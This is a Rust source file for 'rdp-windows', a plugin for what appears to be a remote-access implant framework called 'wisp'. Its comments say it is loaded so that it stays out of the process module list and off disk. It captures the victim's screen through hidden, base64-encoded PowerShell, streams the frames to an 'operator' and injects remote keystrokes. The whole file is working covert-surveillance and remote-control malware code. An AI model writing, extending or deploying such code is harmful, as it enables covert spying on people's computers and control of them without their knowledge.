// rdp-windows (plan P5): the RCP "view" channel logic migrated out of the
// agent into a feature plugin. Loaded with wisp_map, so it never appears in the
// process module list and never touches disk.
//
// Capture and input injection use hidden PowerShell invocations (the same
// technique the built-in placeholder uses); frames flow to the operator through
// the host's view_frame callback into the RCP channel.
use std::collections::HashMap;
use std::ffi::{c_char, CString};
use std::os::raw::c_void;
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use base64::Engine;
use serde::Deserialize;

const CREATE_NO_WINDOW: u32 = 0x0800_0000;

#[repr(C)]
pub struct WispHostApiV1 {
    pub abi: u32,
    pub log: Option<extern "C" fn(u32, *const c_char)>,
    pub view_frame: Option<extern "C" fn(*mut c_void, *const u8, usize) -> i32>,
}

static LOG_FN: AtomicUsize = AtomicUsize::new(0);
static FRAME_FN: AtomicUsize = AtomicUsize::new(0);

fn plugin_log(level: u32, msg: &str) {
    let p = LOG_FN.load(Ordering::Relaxed);
    if p == 0 {
        return;
    }
    let f: extern "C" fn(u32, *const c_char) = unsafe { std::mem::transmute(p) };
    if let Ok(c) = CString::new(msg) {
        f(level, c.as_ptr());
    }
}

struct Session {
    stop: Arc<AtomicBool>,
    handle: Option<JoinHandle<()>>,
}

static SESSIONS: Mutex<Option<HashMap<usize, Session>>> = Mutex::new(None);

fn run_hidden_powershell(script: &str) -> Result<Vec<u8>, String> {
    let units: Vec<u16> = script.encode_utf16().collect();
    let mut bytes = Vec::with_capacity(units.len() * 2);
    for u in units {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    let enc = base64::engine::general_purpose::STANDARD.encode(bytes);
    let out = Command::new("powershell")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", &enc])
        .creation_flags(CREATE_NO_WINDOW)
        .stdin(Stdio::null())
        .output()
        .map_err(|e| format!("powershell spawn: {e}"))?;
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        return Err(format!(
            "powershell exit {}: {}",
            out.status,
            &err[..err.len().min(400)]
        ));
    }
    Ok(out.stdout)
}

fn capture() -> Result<Vec<u8>, String> {
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let png = std::env::temp_dir().join(format!("rdpw_{}_{stamp}.png", std::process::id()));
    let png_s = png.to_string_lossy().to_string();
    let script = format!(
        "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\
         $b=[System.Windows.Forms.SystemInformation]::VirtualScreen;\
         $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);\
         $g=[System.Drawing.Graphics]::FromImage($bmp);\
         $g.CopyFromScreen($b.X,$b.Y,0,0,$bmp.Size);\
         $bmp.Save('{}');",
        png_s.replace('\'', "''")
    );
    run_hidden_powershell(&script)?;
    let data = std::fs::read(&png).map_err(|e| format!("read frame: {e}"))?;
    let _ = std::fs::remove_file(&png);
    Ok(data)
}

fn capture_loop(user: usize, stop: Arc<AtomicBool>) {
    loop {
        if stop.load(Ordering::SeqCst) {
            break;
        }
        match capture() {
            Ok(frame) => {
                let p = FRAME_FN.load(Ordering::Relaxed);
                if p == 0 {
                    break;
                }
                let f: extern "C" fn(*mut c_void, *const u8, usize) -> i32 =
                    unsafe { std::mem::transmute(p) };
                if f(user as *mut c_void, frame.as_ptr(), frame.len()) == 0 {
                    break; // operator side gone
                }
            }
            Err(e) => plugin_log(3, &format!("capture: {e}")),
        }
        for _ in 0..10 {
            if stop.load(Ordering::SeqCst) {
                break;
            }
            std::thread::sleep(Duration::from_millis(100));
        }
    }
}

#[derive(Deserialize)]
struct InputEvent {
    #[serde(default)]
    t: String,
    #[serde(default)]
    s: String,
    #[serde(default)]
    k: String,
}

fn inject_input(ev: InputEvent) {
    let text = if ev.t == "cmd" {
        match ev.k.as_str() {
            "enter" => "{ENTER}",
            "tab" => "{TAB}",
            "esc" => "{ESC}",
            "backspace" => "{BACKSPACE}",
            "space" => " ",
            _ => return,
        }
        .to_string()
    } else if ev.t == "key" && !ev.s.is_empty() && ev.s.len() <= 64 {
        ev.s.clone()
    } else {
        return;
    };
    let escaped = text.replace('\'', "''");
    let script = format!(
        "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{escaped}')"
    );
    let _ = run_hidden_powershell(&script);
}

#[no_mangle]
pub extern "C" fn wisp_plugin_abi() -> u32 {
    1
}

#[no_mangle]
pub extern "C" fn wisp_plugin_init(host: *const WispHostApiV1) -> i32 {
    if host.is_null() {
        return 1;
    }
    let h = unsafe { &*host };
    if h.abi != 1 {
        return 2;
    }
    if let Some(f) = h.log {
        LOG_FN.store(f as usize, Ordering::Relaxed);
    }
    if let Some(f) = h.view_frame {
        FRAME_FN.store(f as usize, Ordering::Relaxed);
    }
    plugin_log(1, "rdp-windows: init ok");
    0
}

#[no_mangle]
pub extern "C" fn wisp_plugin_start() -> i32 {
    plugin_log(2, "rdp-windows: started");
    0
}

#[no_mangle]
pub extern "C" fn wisp_plugin_view_start(user: *mut c_void) -> i32 {
    if user.is_null() || FRAME_FN.load(Ordering::Relaxed) == 0 {
        return 1;
    }
    let stop = Arc::new(AtomicBool::new(false));
    let stop2 = stop.clone();
    let uid = user as usize;
    let handle = std::thread::spawn(move || capture_loop(uid, stop2));
    let mut guard = SESSIONS.lock().unwrap();
    guard.get_or_insert_with(HashMap::new).insert(
        user as usize,
        Session { stop, handle: Some(handle) },
    );
    plugin_log(2, "rdp-windows: view session started");
    0
}

#[no_mangle]
pub extern "C" fn wisp_plugin_view_input(user: *mut c_void, data: *const u8, len: usize) -> i32 {
    if data.is_null() || len == 0 {
        return 1;
    }
    let bytes = unsafe { std::slice::from_raw_parts(data, len) };
    let Ok(ev) = serde_json::from_slice::<InputEvent>(bytes) else {
        return 1;
    };
    let _ = user;
    std::thread::spawn(move || inject_input(ev));
    0
}

#[no_mangle]
pub extern "C" fn wisp_plugin_view_stop(user: *mut c_void) -> i32 {
    let session = {
        let mut guard = SESSIONS.lock().unwrap();
        guard.as_mut().and_then(|m| m.remove(&(user as usize)))
    };
    if let Some(s) = session {
        s.stop.store(true, Ordering::SeqCst);
        if let Some(h) = s.handle {
            let _ = h.join();
        }
        plugin_log(2, "rdp-windows: view session stopped");
    }
    0
}